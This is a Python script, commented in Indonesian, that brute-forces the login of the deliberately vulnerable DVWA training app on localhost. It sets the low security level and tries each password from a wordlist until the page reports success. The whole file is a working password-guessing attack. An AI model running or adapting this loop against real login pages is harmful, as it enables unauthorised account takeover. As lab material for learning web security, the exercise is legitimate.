import requests
from bs4 import BeautifulSoup

# Konfigurasi Target dan Kredensial
TARGET = "http://127.0.0.1:8000"
SECURITY_LEVEL = "low"
USERNAME = "admin"
WORDLIST_FILE = "passlist.txt"

# Menggunakan Session agar Cookie tersimpan otomatis
session = requests.Session()

print("[*] Melakukan login awal ke DVWA...")
login_url = f"{TARGET}/login.php"

# Inisialisasi cookie awal
session.get(login_url)

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

response = session.post(login_url, data=login_data)
print(f"[*] Status Login Awal: {response.status_code}")

# Set cookie level keamanan
session.cookies.set("security", SECURITY_LEVEL)

brute_url = f"{TARGET}/vulnerabilities/brute/"
print(f"[*] Target Brute Force: {brute_url}\n")

try:
    with open(WORDLIST_FILE, "r") as file:
        for line in file:
            password = line.strip()
            if not password:
                continue
            
            print(f"[*] Trying: {password}", end=" ")
            
            params = {
                "username": USERNAME,
                "password": password,
                "Login": "Login"
            }
            
            # Request dengan mengizinkan redirect agar teks asli halaman terbaca
            response = session.get(brute_url, params=params, allow_redirects=True)
            
            # Validasi ketat: Pastikan pesan error tidak ada DAN teks sukses/welcome muncul
            if "Password incorrect" not in response.text and "incorrect" not in response.text.lower():
                if "Welcome" in response.text or "admin" in response.text:
                    print(f"\n[+] KETEMU! Password yang benar adalah: {password}")
                    break
                else:
                    print("[-] Salah")
            else:
                print("[-] Salah")

except FileNotFoundError:
    print(f"[-] File wordlist '{WORDLIST_FILE}' tidak ditemukan!")

